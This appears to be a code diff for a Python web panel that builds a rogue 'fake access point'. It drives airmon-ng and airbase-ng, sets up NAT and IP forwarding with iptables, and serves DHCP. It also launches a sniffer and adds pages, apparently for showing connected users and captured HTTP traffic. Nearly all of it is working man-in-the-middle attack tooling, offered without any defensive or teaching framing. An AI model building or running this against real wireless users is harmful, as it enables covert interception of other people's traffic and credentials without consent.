@@ -2,7 +2,6 @@
 # coding=utf-8
 # code by 92ez.com
 
-from pymongo import MongoClient
 import subprocess
 import datetime
 import platform
@@ -26,7 +25,9 @@ urls = (
     "/getCurrent","currentInfo",
     "/getInterface","netIface",
     "/createAp","createAP",
-    "/rmMon","rmMon"
+    "/rmMon","rmMon",
+    "/getusers","getUsers",
+    "/gethttp","getHTTP"
 )
 
 #static
@@ -212,22 +213,27 @@ class createAP:
         ap = web.input().get("ap")
         channel = '6'
 
+        cleanup()
         # set iptables
         iptables(inet)
         # start monitor
         mon_iface = start_monitor(ap,channel)
         # start ap
-        start_ap(mon_iface, channel, ssid)
+        start_ap(mon_iface, channel, ssid, key, ap)
         # dhcpconf
         ipprefix = getIpfix(inet)
-        try:
-            dhcpconf = dhcp_conf(ipprefix)
-            dhcp(dhcpconf, ipprefix)
-            # os.system(sys.path[0]+'/sniffer.py')
-            return json.dumps({"code":0})
-        except Exception,e:
-            print e
-            return json.dumps({"code":-1,"msg":"Failed!"})
+        dhcpconf = dhcp_conf(ipprefix)
+        dhcp(dhcpconf, ipprefix)
+        subprocess.Popen(['xterm','-e','python',sys.path[0]+'/sniffer.py'], stdout=DN, stderr=DN)
+        return json.dumps({"code":0})
+
+class getUsers(object):
+    def GET(self):
+        return render.users()    
+
+class getHTTP(object):
+    def GET(self):
+        return render.http()    
 
 def getIpfix(inet_face):
     tempres = os.popen("ifconfig "+inet_face).read()
@@ -237,20 +243,15 @@ def getIpfix(inet_face):
     return tempip
 
 def iptables(inet_iface):
-    global forw
     os.system('iptables -X')
     os.system('iptables -F')
     os.system('iptables -t nat -F')
     os.system('iptables -t nat -X')
     os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
-    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
-        forw = ipf.read()
-        ipf.write('1\n')
-        return forw
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
-def cleanup(signal, frame):
-    with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
-        forward.write(forw)
+def cleanup():
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
     os.system('iptables -F')
     os.system('iptables -X')
     os.system('iptables -t nat -F')
@@ -261,10 +262,8 @@ def cleanup(signal, frame):
 
 def start_monitor(ap_iface, channel):
     proc = subprocess.Popen(['airmon-ng', 'start', ap_iface, channel], stdout=subprocess.PIPE, stderr=DN)
-    # todo: cleanup
     proc_lines = proc.communicate()[0].split('\n')
 
-    # Old airmon-ng
     for line in proc_lines:
         if "monitor mode vif enabled" in line:
             line = line.split()
@@ -284,21 +283,19 @@ def dhcp_conf(ipprefix):
               '}')
     if ipprefix == '19' or ipprefix == '17':
         with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
-            # subnet, range, router, dns
             dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '114.114.114.114'))
     elif ipprefix == '10':
         with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
             dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '114.114.114.114'))
     return '/tmp/dhcpd.conf'
 
-def start_ap(mon_iface, channel, essid):
+def start_ap(mon_iface, channel, essid, key, ap):
     print '[*] Starting the fake access point...'
-    try:
-        subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, mon_iface], stdout=DN, stderr=DN)
-        print '[*] Waiting for 7 seconds...'
-        time.sleep(6)
-    except KeyboardInterrupt:
-        cleanup(None, None)
+    subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid,'-w',key, mon_iface], stdout=DN, stderr=DN)
+    # subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, mon_iface], stdout=DN, stderr=DN)
+    print '[*] Waiting for 6 seconds...'
+    time.sleep(6)
+    print '[*] '+essid+' set up on channel '+channel+' via '+mon_iface+' on '+ap + ' key is '+key
     subprocess.Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
     subprocess.Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)
 
@@ -333,23 +330,5 @@ if __name__ == "__main__":
     if os.geteuid() != 0:
         sys.exit('[Error!!!] You must run this script as root')
 
-    ifirst = raw_input('[Warning] If you run this script first time? (y/n):')
-
-    if ifirst == 'y':
-
-        print '[Waiting] Install and update modules...'
-        print '-'*82
-
-        os.system('pip install -U web.py')
-        os.system('pip install -U psutil')
-        os.system('pip install -U pymongo')
-        os.system('pip install -U scapy')
-        os.system('apt-get install mongodb -y')
-        os.system('service mongodb restart')
-        os.system('apt-get -y install isc-dhcp-server')
-
-        print '-'*82
-
-    rm_mon()
     app = web.application(urls,globals())
     app.run()
